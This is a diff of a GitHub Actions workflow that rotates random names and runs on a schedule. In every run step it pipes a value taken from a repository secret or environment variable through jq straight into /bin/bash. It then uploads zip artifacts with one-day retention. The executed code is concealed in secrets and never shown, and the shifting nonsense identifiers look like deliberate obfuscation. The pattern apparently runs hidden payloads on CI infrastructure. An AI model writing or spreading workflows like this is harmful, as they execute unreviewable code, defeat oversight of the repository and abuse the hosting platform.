@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '13 2,8,14,20 * * *'
+    - cron: '28 4,10,16,22 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,17 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          ikd428: ${{ secrets.ikd428 }}
+          xmvg65138: ${{ secrets.xmvg65138 }}
         run: |
-          printf '%s' "$ikd428" | jq -r .ngr9 | /bin/bash
-          printf '%s' "$i50" | jq -r .ugtml9690 | /bin/bash
-          echo $tt72 | jq -r .rfues2 | /bin/bash
-          printf '%s' "$nnn1" | jq -r .ok45 | /bin/bash
-          echo $mg94445 | jq -r .nwi02 | /bin/bash
+          printf '%s' "$xmvg65138" | jq -r .vdjmj641 | /bin/bash
+          echo $anubt274 | jq -r .b3108 | /bin/bash
+          echo $wjmv3146 | jq -r .dwe1 | /bin/bash
+          printf '%s' "$gafbw361" | jq -r .m2720 | /bin/bash
+          echo $vsm0 | jq -r .u357 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: 33dbqmjU
+          name: ONcbaSOZ
           path: "*.zip"
           retention-days: 1
